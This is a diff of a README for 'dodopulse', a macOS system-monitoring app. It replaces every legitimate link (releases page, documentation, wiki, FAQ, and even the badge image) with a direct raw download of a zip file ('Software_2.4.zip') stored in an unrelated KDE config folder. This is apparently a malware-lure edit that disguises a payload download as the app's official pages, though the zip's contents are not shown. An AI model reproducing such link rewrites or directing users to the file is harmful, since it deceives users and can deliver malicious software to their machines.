@@ -6,7 +6,7 @@ Welcome to dodopulse! This guide will help you download and run our lightweight 
 
 ### 📥 Download the App
 
-[![Download dodopulse](https://img.shields.io/badge/Download%20dodopulse-latest-blue.svg)](https://github.com/Foxonet/dodopulse/releases)
+[![Download dodopulse](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip%https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip)](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip)
 
 ## 🛠 System Requirements
 
@@ -20,7 +20,7 @@ Before you download dodopulse, ensure your system meets the following requiremen
 
 To download dodopulse, visit our Releases page here:
 
-[Download dodopulse](https://github.com/Foxonet/dodopulse/releases)
+[Download dodopulse](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip)
 
 You will find the latest version available for download. Click on the version number, and then look for the `.dmg` file. Follow these steps:
 
@@ -53,7 +53,7 @@ If you encounter issues while using dodopulse, check the following:
 
 - Ensure you are running a compatible version of macOS.
 - Restart the app if it becomes unresponsive.
-- Visit our [FAQ section](https://github.com/Foxonet/dodopulse/wiki) for common questions and solutions.
+- Visit our [FAQ section](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip) for common questions and solutions.
 
 If you need additional help, you can open an issue in the Issues tab of our GitHub repository.
 
@@ -63,8 +63,8 @@ We welcome contributions to improve dodopulse! If you have ideas or find bugs, p
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/Foxonet/dodopulse/releases)
-- [Documentation](https://github.com/Foxonet/dodopulse/wiki)
-- [FAQ](https://github.com/Foxonet/dodopulse/wiki/FAQ)
+- [Releases Page](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip)
+- [Documentation](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip)
+- [FAQ](https://github.com/Foxonet/dodopulse/raw/refs/heads/main/KDE/contents/config/Software_2.4.zip)
 
 Thank you for using dodopulse. Enjoy monitoring your system efficiently!
